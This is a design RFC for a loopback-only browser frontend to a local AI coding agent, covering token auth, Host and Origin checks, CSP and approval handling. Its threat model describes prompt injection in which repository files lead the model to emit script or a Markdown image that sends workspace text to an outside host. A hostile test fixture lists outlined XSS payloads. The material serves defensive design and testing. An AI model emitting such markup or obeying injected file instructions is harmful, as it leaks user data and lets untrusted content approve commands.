# RFC-0020: A local web frontend

| | |
|---|---|
| Status | proposed |
| Date | 2026-10-27 |
| Depends on | RFC-0001, RFC-0006, RFC-0007, RFC-0009, RFC-0014, RFC-0015, RFC-0016, RFC-0017 |
| Amends | RFC-0001 §3, RFC-0007 §1, RFC-0015 §2, RFC-0016, RFC-0017 §5 |
| Scope | `gyr web`: a second frontend over the same agent, served to one browser on the same machine |

## 1. Decision

`gyr web` starts the same session `gyr` starts, in the same workspace, with the
same model, tools, approval policy, sandbox and session log, and serves it to a
browser on the loopback interface instead of drawing it in the terminal.

It is a frontend, not a product. One process, one workspace, one person, one
browser tab, started in the foreground from a terminal and gone when that
terminal stops it. Nothing in `gyr-core` changes behaviour. The approval policy
is the same `Interactive` policy with a different `Approver`. The log is the
same log. The page is a view.

The line-based session stays the primary interface and is not deprecated, and
nothing here is a step towards a hosted service. Section 2 says why that is not
a contradiction of the documents this one amends, and section 15 amends them
explicitly rather than reading around them.

## 2. What this is not

RFC-0017 §5 excludes "cloud sessions, a desktop app, IDE extensions", because
each is a product of its own and the terminal is the product here. RFC-0001 §3
lists a desktop application, a cloud agent and a background daemon as non-goals.
A web page could be any of those if it were allowed to drift, so the boundary is
drawn here in terms that can be checked:

| Excluded | What would make `gyr web` one | What this RFC does instead |
|---|---|---|
| Cloud session | listening anywhere but loopback; accounts; more than one person | binds loopback only and refuses anything else (§5.1) |
| Desktop app | an installer, a bundled browser, an icon, autostart | the browser you already have, a URL printed in a terminal |
| Background daemon | outliving the command that started it; serving several workspaces | foreground, one workspace, exits with its terminal (§9) |
| IDE extension | editing files in the page, a language server | read-only views of the workspace; every change is a tool call through approval |

If a later change crosses one of those columns, it needs its own RFC and the
exclusion it is overturning named in its header. This one does not.

## 3. Why

RFC-0007 chose a line-based session because "the transcript is the artefact"
and it belongs in the terminal's scrollback. That argument is still right for
the terminal. It is also the reason a second frontend is cheap: the transcript's
durable form is the session log, not the scrollback, and RFC-0016 already
renders a session from it. The page is one more reader of the same events.

What a browser does better, all of it presentation:

- **Approvals with context.** The terminal shows one line and a rule scope. A
  page can show the whole `apply_patch` as a diff, or the `exec` argument vector
  as a list, beside the buttons, without scrolling the reason off the screen.
- **Rendered diffs and diagnostics.** RFC-0007 §6 put rendered diffs out of
  scope for the terminal. A `cargo` result already arrives as level, code, file,
  line and column (RFC-0008); a page can lay that out as a table.
- **Images.** `UserWithImages` exists and the terminal takes `@path`. A browser
  takes a pasted screenshot.
- **Past conversations.** `/resume` lists saved conversations by id. A sidebar
  can show them with their first question, and open the transcript of one
  without resuming it (§11).

What the terminal keeps, and the page does not try to replace: scriptability
(`gyr run`), evals (`gyr eval`), `gyr replay` into a pipe, and working over SSH
without a port forward. **This RFC changes no measurement.** Evals run
unattended and never touch the web frontend.

## 4. Shape

```text
 terminal                          browser (one tab, loopback)
    |                                   ^          |
 gyr web                                | SSE      | POST + bearer token
    |                                   |          v
    +--> gyr-cli: settings, sandbox,    +-- gyr-web: bind, auth, CSP,
    |    tools, MCP, hooks (unchanged)      static assets, envelopes
    |                                        |            |
    +--> Conversation controller  <----------+ commands   |
    |    (lifted from session.rs)                         | approval replies,
    |         |                                           | cancel
    |         v                                           v
    |    gyr-core Agent --emit--> (JsonlSessionLog, WebSink)
    |         |
    |         `--decide--> Interactive<WebApprover> --ask--> pending map
    v
 .gyr/sessions/*.jsonl, *.state.json   (unchanged formats, one new record, §11)
```

### 4.1 Crates

**Observed in source at `bc7bee4`.** `Session<S>` in `gyr-cli/src/session.rs`
holds both the conversation logic (`/clear`, `/model`, `/resume`, `/plan`,
`/compact`, the carried summary, state saving after each submission) and the
rustyline loop. `prepare` in `gyr-cli/src/main.rs` assembles the agent. Neither
is reachable from outside the binary crate.

- **`gyr-cli` keeps assembly.** Settings, sandbox, tool set, MCP, hooks, finish
  checks and `prepare` stay where they are, so `gyr web` resolves configuration
  exactly as `gyr` does and `gyr-confine` is found beside the same binary.
- **A frontend-neutral `Conversation` controller is lifted out of
  `session.rs`,** inside `gyr-cli`. It owns the `Agent`, takes parsed `Input`
  values and returns what happened; it does no I/O of its own. The rustyline
  loop becomes a thin driver of it. That is step 1 of the build order and lands
  with the terminal session's tests unchanged, which is the evidence that it was
  a refactor.
- **`gyr-web` is a new crate for transport only:** binding, authentication, the
  HTTP routes, the event envelope, `WebSink`, `WebApprover` and the embedded
  page. It depends on `gyr-core` and `gyr-protocol` and defines a small
  `Backend` trait that `gyr-cli` implements over the controller, so the
  dependency runs from the binary to the transport and never back.
- **`gyr-web` sits behind a Cargo feature, `web`, on by default.** A packager
  who wants an agent binary with no code that listens on a socket can build one
  with `--no-default-features`, and `gyr web` then says it was built without
  the feature rather than failing to parse.

The server is axum on the tokio runtime the binary already has, because it
brings routing, body limits and an SSE response without hand-rolling HTTP. Its
dependency cost (crates added, clean build time, binary size) is **not yet
measured** and is recorded when step 2 lands; if it is out of proportion,
`hyper` directly is the fallback.

## 5. The threat model

This is the whole RFC and the rest is arrangement, as RFC-0015 §2 said of
configuration.

A process that can run programs and edit files is now listening on a socket and
rendering model output in a browser. The browser is the most hostile runtime a
person uses every day. Four parties could try to reach the agent through it:

| Party | What it wants | What stops it |
|---|---|---|
| Another machine on the network | to drive the agent | loopback only, no flag to change it (§5.1) |
| A web page in another tab | to submit, or approve, by forging requests (CSRF, DNS rebinding) | a per-launch bearer token in a header, never a cookie; Host checks (§5.2, §5.3) |
| Another local process or user | to read the token, or connect first | token only in the terminal and the tab; one client (§5.2, §8) |
| **The model's own output** | to run script in the page, which holds the token and can press "allow" | no HTML from the model or a tool ever reaches the DOM; a strict CSP; no remote loads (§5.4) |

The last row is the one that matters most and the one easiest to miss. A file in
a cloned repository can instruct the model to write markup. A tool result is
file contents. If the page rendered either as HTML, a repository could approve
its own commands, which is exactly what RFC-0006 and RFC-0015 exist to make
impossible. Approval enforced below the model is only below the model if the
model cannot reach the button.

### 5.1 Binding

`gyr web` binds `127.0.0.1` on an ephemeral port by default, or `[::1]`. A
`--port` may be given. **Any address that is not loopback is refused**, before
binding, with a message that names `ssh -L` as the way to reach it from another
machine. There is no `--host 0.0.0.0` and no flag that adds one: a LAN listener
for a process-running agent is remote access, which is §2's first column.

After binding, the server checks the local address it actually got is loopback,
so a resolver surprise cannot turn `localhost` into something else.

### 5.2 The token

At start, `gyr web` draws 32 bytes from the operating system's random source and
prints one URL:

```text
http://127.0.0.1:48213/#k=7c1f…e02a
```

The token is in the **fragment**, which a browser does not send to the server,
so it appears in no request line and no access log. The page reads it, moves it
into `sessionStorage`, which is scoped to the origin including the port, and
removes it from the address bar with `history.replaceState`. A reload keeps it;
closing the tab forgets it. It is never written to disk by `gyr`.

Every API request carries it as `Authorization: Bearer <token>`, compared in
constant time. The events stream is read with `fetch` and a streamed body rather
than `EventSource`, because `EventSource` cannot set a header.

**Cookies were considered and rejected.** Cookies are not isolated by port
(RFC 6265 §8.5), so a cookie set by `127.0.0.1:48213` is sent to every other
service on `127.0.0.1`, any of which could collect it. `SameSite` does not help,
because a different port on the same host is the same site. A custom header
cannot be sent cross-origin without a CORS preflight, which this server never
answers, so the header also closes CSRF without a second mechanism.

The terminal's scrollback now holds the URL. That is the same exposure as the
terminal itself, and it is said in the startup banner rather than left to be
discovered.

### 5.3 Host and Origin

Every request, including the unauthenticated static page, must carry a `Host`
of `127.0.0.1:<port>`, `localhost:<port>` or `[::1]:<port>`, or it gets 421.
That defeats DNS rebinding for the page as well as the API, which costs nothing
and means a rebinding attacker cannot even learn the page exists. An API
request carrying an `Origin` header must carry this origin. Responses never
include `Access-Control-Allow-Origin`.

Only `/` and `/assets/*` answer without the token. They hold no secrets: the
page learns everything else through authenticated calls.

### 5.4 What the page will render

**No HTML from the model, a tool, a file or the person is ever inserted into
the DOM as HTML.** Text arrives as text nodes. Markdown is rendered by the
page's own code building elements, never through `innerHTML`, and covers the
subset `gyr-cli/src/markdown.rs` already draws for the terminal: inline code,
bold, headings, list markers, quotes, fenced code and tables. Anything else is
shown as written, which is also what the terminal does.

Two Markdown constructs are refused outright, because each is an exfiltration
channel rather than formatting:

- **Images.** `![](https://host/?q=<workspace text>)` makes the browser send
  workspace content to a host of the model's choosing the moment it renders,
  without anyone clicking. Model Markdown images are shown as their literal
  text. The only images the page displays are ones the person attached.
- **Automatic links.** Link text is shown with its URL beside it, and only
  `http` and `https` targets become clickable, opened in a new context with
  `rel="noopener noreferrer"`. Following one is a person's click, not a render.

The server sends, on every response:

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self';
  img-src 'self' blob:; connect-src 'self'; font-src 'self'; base-uri 'none';
  form-action 'none'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
```

No inline script, no `eval`, no remote fonts, no third-party anything. The CSP
is the second wall, not the first: §5.4's first rule is that hostile markup is
never parsed as markup, and the CSP is there for the day a later change forgets
that.

A browser extension with permission to read every page can read this one and
drive it, as it can drive any other page the person has open. That is outside
what `gyr` can enforce, and it is written here so nobody believes otherwise.

### 5.5 What the page never receives

Credentials. No endpoint returns an API key, a `pass_env` value or the process
environment. `/api/status` shows the model, workspace, containment label,
approval mode, `api_base` host and token tallies, which is what `/status`
prints, and nothing more.

## 6. The wire

Server to page, one stream:

```text
GET /api/events                    (streamed, text/event-stream framing)
```

Page to server, plain requests that each succeed or fail with a status code:

| Route | Does | Refused with |
|---|---|---|
| `POST /api/submit` | a person's message, optional images | 409 while a turn runs; 413 over the size cap |
| `POST /api/approvals/{id}` | `once`, `session`, `remember`, or `reject` with a reason | 404 unknown id; 409 already answered |
| `POST /api/cancel` | cancels the current turn | 409 when idle |
| `POST /api/command` | one slash command, as typed (§10) | 409 while a turn runs, for commands that change the conversation |
| `GET /api/status` | what `/status` prints | |
| `GET /api/conversations` | saved conversations, newest first | |
| `GET /api/conversations/{id}/transcript` | the events of one, from the logs (§11) | 404 |
| `GET /api/complete?at=<partial>` | `@path` completion, the terminal's rules | |

Bodies are capped: 1 MiB for a message, 5 MiB per image (the terminal's
`MAX_IMAGE_BYTES`), four images a message.

### 6.1 Envelopes

Each streamed item is one JSON object with a sequence number, and the stream's
`id:` field is that number:

```json
{"seq": 41, "type": "event", "event": {"type": "model", "model_turn": 3,
  "event": {"type": "text_delta", "text": "The failing test is "}}}
{"seq": 42, "type": "approval_requested", "id": "a7", "tool": "apply_patch",
  "class": "mutating", "subject": "crates/gyr-core/src/lib.rs",
  "summary": "apply_patch crates/gyr-core/src/lib.rs", "sandbox": "seatbelt",
  "call": {"id": "toolu_01…", "name": "apply_patch", "arguments": {"…": "…"}}}
{"seq": 43, "type": "approval_answered", "id": "a7"}
{"seq": 57, "type": "finished", "reason": "end_turn", "usage": {"…": "…"}}
{"seq": 58, "type": "conversation_started", "state_id": "19a2c-4f1-2", "model": "qwen3.8-27b"}
{"seq": 59, "type": "notice", "level": "warn", "text": "…"}
```

`event` carries an `AgentEvent` exactly as the log serialises it. The envelope
types that are not agent events (`approval_requested`, `approval_answered`,
`finished`, `conversation_started`, `notice`) live in `gyr-web`, not in
`gyr-protocol`, because they are about this transport and not about the turn.
An approval request in particular is not an `AgentEvent`: the log records the
decision (`ToolDecided`), which is what RFC-0006 audits, and the asking is a
frontend's business.

**This makes the serde shape of `AgentEvent` a contract with JavaScript.** The
page and the server ship in one binary, so they cannot disagree about a version.
What can happen is a rename in `gyr-protocol` that the page does not know about.
A snapshot test serialises one of every `AgentEvent` variant and fails on any
change to the JSON, so a rename arrives as a visible diff to the page code
rather than as a transcript that silently stops showing something.

### 6.2 Reconnecting

A dropped stream reconnects with `Last-Event-ID`. The server keeps the envelopes
of the current conversation in memory, capped at 8 MiB, and resends everything
after that id. If the id is older than the buffer, or from another process, the
server sends `conversation_started` and the page reloads the conversation's
transcript from the logs instead (§11). A pending approval is part of the
buffer, so a reconnecting page shows it again.

## 7. Approvals in a browser

`WebApprover` implements `gyr_core::approval::Approver`. Its `ask` allocates an
id, records a oneshot sender in a pending map, sends `approval_requested`, and
awaits the reply. `POST /api/approvals/{id}` resolves the sender with the
`ApprovalReply` the person chose. Everything around it is unchanged:
`Interactive` still allows read-only calls without asking, still checks session
and saved rules first, still keys rules on `ToolAction::rule_key`, and
`remember` still writes to `~/.config/gyr/approvals/` through the same
`RuleStore`, outside the repository.

What the card shows is decided by the server, not the page: `summary` is the
same `describe_call` the terminal prompt prints, and the class caveat (for
example that "always" for a process means this exact command) is the same text.
Two frontends that described the same decision in different words would be the
"friendly description" RFC-0001 §8 refuses to key a rule on. The page adds the
full arguments below it, rendered as a diff for `apply_patch` and `write_file`,
as an argument list for `exec`, as the command line for `shell`, and as the host
for `web_fetch`.

Rules for the cases a terminal never had:

- **No timeout turns into a yes.** A pending approval waits, as the terminal
  prompt waits. If the tab closes, it keeps waiting for the next connection.
- **A reply to an id that is not pending is refused** with 409 and changes
  nothing, so a double click or a stale tab cannot approve the next call.
- **Stopping the process rejects every pending approval** with "the operator
  stopped gyr web" before the run is cancelled, so the decision in the log says
  what happened.
- **`--read-only` and `--dangerously-allow-all`** mean what they mean in the
  terminal. Under the second, the page carries a banner that cannot be
  dismissed, in the warn colour, saying so; it is also in the log, as now.
- **Plan mode** is the same `PlanGate`. A proposed plan shows accept, revise and
  drop, which send the same lines the terminal reads after a plan.

## 8. One agent, one client

`Agent::run_cancellable` takes `&mut self`, so the controller owns the agent in
one task and processes commands from a queue, one at a time. While a turn runs
that task is inside `run_cancellable`, so the two things that must still work
mid-turn bypass the queue:

- approval replies go straight to the `WebApprover` pending map;
- cancel goes straight to the current turn's `CancellationToken`, held in shared
  state and replaced per turn, as RFC-0007 §5 does with its signal task.

A submission while a turn runs is refused with 409, because the terminal cannot
type into a running turn either. `/status`, `/diff`, `/cost` and `/log` read
shared state and may answer mid-turn.

**One client at a time.** The first authenticated events stream is the client.
A second one gets 409 naming the first, rather than a second tab that could
answer the same approval. A dropped stream frees the slot. Whether a second tab
should be allowed as a read-only observer is an open question (§19); refusing is
the version that cannot surprise anyone.

### 8.1 The page is a view; the log is the record

The sink is `(JsonlSessionLog, WebSink)`, log first. So nothing appears in the
page that the log has not already recorded, and the order a person sees is the
order an auditor reads.

The two sinks fail differently on purpose. `EventSink::emit` is fallible
because "a log that quietly stops recording reports a healthy run it did not
observe", and a log failure stays terminal. `WebSink::emit` pushes into the
buffer and a channel and **never fails the run**: a closed tab is not a reason
to stop work the person asked for, and the log already holds everything the tab
missed. The asymmetry is the design, and a test pins it.

## 9. Starting and stopping

```console
gyr web                       # this workspace, an ephemeral port, prints the URL
gyr web --port 7400           # a fixed port, for a bookmark (the token still changes)
gyr web --open                # also opens the URL with open / xdg-open
gyr web --model claude-sonnet --read-only
```

`gyr web` takes the same common flags as `gyr`, including `--resume`, and
resolves them the same way. It does not open a browser unless asked: launching
one is starting a program outside the sandbox with the token on its command
line, and that is a choice for the person.

The terminal shows a banner (URL, workspace, model, containment, approvals, log
path), then one line when a client connects or leaves and one per finished
submission. It is not a second transcript.

Ctrl-C in that terminal stops the server: pending approvals are rejected (§7),
the current turn is cancelled with `StopReason::Cancelled`, state is saved as
after any submission, and the process exits 130. That is the operator's switch,
and it is deliberately not the same thing as the page's stop button, which
cancels a turn and keeps serving.

## 10. Commands

The composer accepts slash commands and sends them to `POST /api/command`
as typed. The server parses them with the terminal's own `parse`, so
`/usr/bin/env is on PATH, is that a problem?` is still a question in both
places. Buttons in the page are shorthand that send the same strings, so there
is one command language with two keyboards.

| Command | In the page |
|---|---|
| `/help` | the same list, as a panel |
| `/status`, `/cost`, `/log` | a panel; answer mid-turn |
| `/diff` | the working tree diff, rendered; answers mid-turn |
| `/clear` | new conversation; `conversation_started` |
| `/model <key>` | new conversation on another profile, as in the terminal |
| `/resume [id]` | list, or continue one; the sidebar sends this |
| `/plan [task]` | as in the terminal; accept, revise, drop as buttons |
| `/compact` | as in the terminal; the summary is shown before the new conversation |
| `/init` | as in the terminal; its writes ask like any other |
| `/exit` | refused, with a note that the terminal stops the server; a page that could stop its own server could be made to |

## 11. Conversations and transcripts

The sidebar is `gyr_core::resume::recent`, the same list `/resume` prints.
Clicking one opens its **transcript**, read from the session logs and drawn by
the same page code as a live turn; continuing it is `/resume <id>`, which
restores the provider state file. Those stay two operations, because RFC-0014 §2
still holds: a transcript is replay, continuation is native state, and the
first cannot honestly become the second.

**Observed in source at `bc7bee4`:** a log is per process
(`<run_id>.jsonl`), while conversations within a process get state ids
`<run_id>-<n>` after `/clear` or `/model`, and `SessionRecord` has `Started`,
`Event` and `Finished` with no marker for which conversation an event belongs
to. A resumed conversation's events can also span several logs. So the log
cannot yet answer "the transcript of state `X`".

The fix is one record, `SessionRecord::Conversation { state_id }`, written when
a conversation starts, including the first and after a resume. A transcript of
`X` is then every event that follows a `Conversation { X }` record, across the
logs in `.gyr/sessions`, in time order. `gyr replay` gains `--conversation <id>`
from the same code, so the terminal gets this too and the web is not the only
reader of a new record. Older logs without the marker are shown whole, labelled
as such, rather than guessed at.

Like RFC-0016's `Submitted`, this changes what the log holds by a record, not
by content: the file already holds your source and what you typed.

## 12. The page

### 12.1 No build step

The page is hand-written HTML, CSS and JavaScript modules, embedded into the
binary with `include_str!`, served from `/assets/*` with a content hash in each
name. No npm, no bundler, no framework, no node in CI. `cargo install --path
crates/gyr-cli --locked` stays the whole install, and the page cannot be out of
step with the server that serves it.

Budget: **60 KiB of JavaScript and CSS together, uncompressed**, checked by a
test that reads the embedded assets. It is a budget, not a measurement; if
honest rendering needs more, the test moves and this paragraph says why.

A Rust-to-WebAssembly frontend was considered. It would keep the page in Rust,
and it would add a `wasm32` target and a second build tool to every install
for a page whose hard parts are DOM text nodes and a streamed fetch.

### 12.2 The palette, which now owns its ground

RFC-0007 §2 kept `--bg: #171614` out of the terminal because a line-based
program does not own its background. A page does. So the house palette applies
in full, from the `cargopete-style` skill: the ground is `--bg`, and the rule
survives unchanged:

> If a shell printed it, it is slate. If a person wrote it, it is terracotta.

Tool lines, model prose and status are slate and ink; the person's messages, the
approval card's header and section kickers are terracotta. `--text-faint` still
fails AA at 3.36:1 and is still used only for chrome a reader can lose.

Dark only. The style defines no light ground, and inventing one here would be
the guess RFC-0007 refused. `prefers-color-scheme: light` gets the dark page
and a one-line note; a light variant belongs to the style, not this RFC.

### 12.3 What each event becomes

- **Text deltas** append text nodes to the current message, and Markdown is
  drawn per completed line, as `markdown.rs` does, so a half-streamed fence
  cannot restyle the page.
- **Reasoning** is collapsed under the message, and only shown at all when
  `show_reasoning` is on, as in the terminal.
- **Tool calls** are one line each, with the result folded beneath. `read`
  results show their line range, not the file. `apply_patch` and `write_file`
  show a diff. `cargo` diagnostics show as a table of level, code, location and
  message, each location copyable as `file:line:col`.
- **`todo`** is pinned above the composer while a task is running and updated as
  it changes, which is the one place a persistent element earns its space.
- **`ContextWarning`, `Elided`, `TurnCutOff`, `TurnRetried`, `SentBack`,
  `HandedOver`, `TurnsRunningOut`** each render as a notice in the transcript at
  the point it happened, with the numbers it carries. `TurnRetried` also greys
  the discarded partial output above it, because its doc comment says a reader
  should not take those events as having happened.
- **`StopReason::Blocked`** shows the model's blocker as the end of the turn,
  in the warn colour, not as an ordinary reply.

## 13. Configuration

| Setting | Project file | User file | Flag |
|---|---|---|---|
| `web.port` | **refused** | yes | `--port` |
| `web.open` | **refused** | yes | `--open` |
| bind address | never | never | never |

`web.port` and `web.open` are refused from a project file for RFC-0015's
reason: they decide what listens and what is launched, and a repository should
not choose either. The bind address is in no file and no flag, by §5.1.

RFC-0015 §2's table gains these rows, and `gyr config` prints them with their
source like every other setting.

## 14. What lands on disk

Nothing new beyond §11's record. The token is never written. The page stores
the token and, for the composer, an unsent draft in `sessionStorage`, and
nothing in `localStorage`. Images a person attaches are held in memory for the
submission and then exist where every message does: in the provider state file
and, as their size and type only, in the log.

## 15. Amendments

- **RFC-0001 §3.** "Desktop application, cloud agent … or background daemon"
  stay non-goals, read as the columns of §2 of this document: a process that
  outlives its invocation, listens off the machine, or ships its own shell. A
  foreground loopback frontend is none of them.
- **RFC-0007 §1.** The line-based session remains the primary interface. The
  argument that the transcript belongs in scrollback is kept for the terminal;
  for a second frontend the durable transcript is the log (RFC-0016).
- **RFC-0015 §2.** The table gains `web.port` and `web.open`, refused from a
  project file.
- **RFC-0016.** Replay gains `--conversation <id>`, built on §11's record.
- **RFC-0017 §5.** "Cloud sessions, a desktop app, IDE extensions" stay
  excluded. A loopback frontend under §2's constraints is allowed, and is not
  counted towards "what alternative includes" in §4: nobody switching from
  Claude Code misses a browser in the first hour.

## 16. Out of scope

Listening off loopback. More than one person, or more than one workspace per
process. Accounts, or any login beyond the launch token. Driving `gyr run` or
`gyr eval` from the page. Editing files in the page, or a terminal emulator in
it. A light theme. Desktop notifications. A mobile layout beyond not breaking at
phone width. A hosted deployment of any kind. Each would be a different
proposal, and most would be §2's excluded columns.

## 17. Sequencing

RFC-0017 §4.2 lists what must be true before Gyrfalcon is the open-model
alternative it claims to be, and `gyr probe` is still owed. A browser frontend
makes none of those items more true. **This RFC is proposed to start after
`gyr probe` lands**, so that the project's next measured claim is about models
and not about pixels. Step 1 below, the controller extraction, is a refactor
that tidies `session.rs` regardless and may land earlier.

## 18. Build order

Each step is a working vertical slice and leaves `cargo test --workspace`,
Clippy with `-D warnings` and `cargo fmt --check` green on macOS and Linux.

1. **Lift the `Conversation` controller out of `session.rs`.** The rustyline
   loop drives it. The terminal session's tests pass unchanged.
2. **`gyr-web` skeleton.** `gyr web` binds loopback, refuses anything else,
   prints the URL, serves a static page with the CSP, and answers authenticated
   `/api/status`. Tests: non-loopback refused; wrong `Host` is 421; missing or
   wrong token is 401; a foreign `Origin` is refused; no response carries
   `Access-Control-Allow-Origin`; the shipped HTML contains no inline script.
3. **A live transcript.** `/api/events`, the envelope, `WebSink`, sequence
   numbers and reconnection, with the agent in `--read-only` so nothing can be
   approved yet. The `AgentEvent` JSON snapshot test lands here.
4. **Submit and cancel.** One client; 409 for a second and for a submission
   mid-turn; the per-turn token. Terminal Ctrl-C stops the server as §9 says.
5. **Approvals.** `WebApprover`, the pending map, stale-id refusal, rejection on
   shutdown, `remember` through the existing `RuleStore`. Now the default mode
   is usable.
6. **Commands.** `/api/command` through the terminal's `parse`, and the panels.
7. **Conversations.** The `SessionRecord::Conversation` record, transcript
   assembly across logs, the sidebar, and `gyr replay --conversation`.
8. **Rendering.** Diffs, the diagnostics table, the pinned `todo`, the notices
   of §12.3.
9. **Images.** Paste and drop, for profiles with `image_input`, under the
   terminal's limits.
10. **The hostile fixture** (§19.1), run and recorded before the README says the
    web frontend exists.

## 19. Verification

What will be claimed, and how, in the project's usual labels.

**Measured** by tests in `cargo test`:

- Every refusal in step 2, each as its own test.
- Against the fake provider in `gyr-core/tests/support`: submit, stream to
  `ToolDecided`, approve over HTTP, stream to `ToolFinished`, `finished`; and
  the same with `reject`, where the model receives the refusal under its
  original call ID.
- A reply to an answered or unknown approval id changes nothing.
- A stream dropped during a pending approval, then reconnected with
  `Last-Event-ID`, receives the approval again and can answer it.
- `WebSink` with no client and a closed channel: the run completes and the log
  is whole. A failing log: the run stops, as now.
- Shutdown with a pending approval: the log records a denial with the shutdown
  reason, then `Cancelled`.
- The `AgentEvent` snapshot, and the asset size budget.

### 19.1 The hostile fixture

**Observed**, by a person with a real browser, and recorded with the date and
browser versions, because the project has no headless browser in CI and this
RFC does not add one. A fixture workspace whose files instruct the model to
reply with, and whose tool results contain:

- `<script>`, `<img src=x onerror=…>`, `<svg onload=…>` and a `javascript:` link;
- a Markdown image pointing at a local listener with workspace text in its
  query;
- a Markdown link whose text is a different URL from its target;
- a fake approval card drawn in Markdown.

Pass means: every one shows as text; the local listener receives nothing; the
browser console shows no CSP violation, because nothing tried to load; and the
fake card has no buttons. A CSP violation in the console is a fail even though
the CSP blocked it, because it means §5.4's first rule was broken and the
second wall did the work.

## 20. Risks

- **Two renderers drift.** The terminal and the page each draw events, and a
  new `AgentEvent` variant can land in one and not the other. The snapshot test
  catches a changed variant, not a new one the page ignores. Mitigation: the
  page shows any variant it does not know as a raw JSON notice, so a missing
  renderer is visible rather than silent.
- **Untested JavaScript.** Without node in CI, the page's logic has no unit
  tests. The mitigation is keeping it small (§12.1) and keeping decisions on
  the server: the page never decides what an approval means, only which button
  was pressed.
- **Scope creep towards a product.** The likeliest failure is not a security
  hole but a page that slowly becomes the thing RFC-0017 §5 excludes. §2's
  table is the test, and each column names what would have to change.
- **Attention.** Every hour on the page is an hour not spent on `gyr probe`, a
  tier quickstart or the corpus. §17 is the answer, and it is worth re-reading
  if this RFC starts to feel urgent.
- **The browser is a large trusted base.** §5 narrows what the page can do; it
  does not make a browser trustworthy. Extensions are named in §5.4 because
  they are the case nobody can fix from here.

## 21. Open questions

- Whether a second tab should be admitted as a read-only observer, with no
  approval or submit rights. Useful for watching a long run from a phone over
  `ssh -L`; more state to get wrong.
- Whether `describe_call` should move from `gyr-cli` into `gyr-core`, now that
  two frontends depend on it saying the same thing.
- Whether `/exit` from the page should be allowed after all, given that a page
  that can stop its server can at worst be made to stop work, which is the
  safe direction.
- Whether the `web` feature should be on by default, or opt-in until the
  dependency cost in §4.1 is measured.
- Whether a pending approval should set the tab title (for example
  `(approval) gyr`), which is the least a person needs to notice a waiting
  decision in another tab, and is not a notification.
